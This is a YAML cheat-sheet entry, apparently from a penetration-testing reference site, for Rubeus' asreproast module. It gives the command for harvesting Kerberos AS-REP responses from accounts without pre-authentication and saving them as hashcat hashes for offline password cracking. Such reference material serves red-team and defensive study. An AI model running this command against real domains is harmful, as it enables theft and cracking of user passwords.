---
description: |
  Rubeus' `asreproast` module will attempt to harvest the non-preauth AS_REP responses for a given list of usernames. These responses will be encrypted with the user's password, which can then be cracked offline. The following command is run on a Windows machine in the victim domain.

  Command Reference:

  	Output File: hashes.txt

items:
  Username:
    - code: |
        Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
  Password:
    - code: |
        empty
filters:
  Kerberos:
    - code: |
        empty
  Windows:
    - code: |
        empty
---
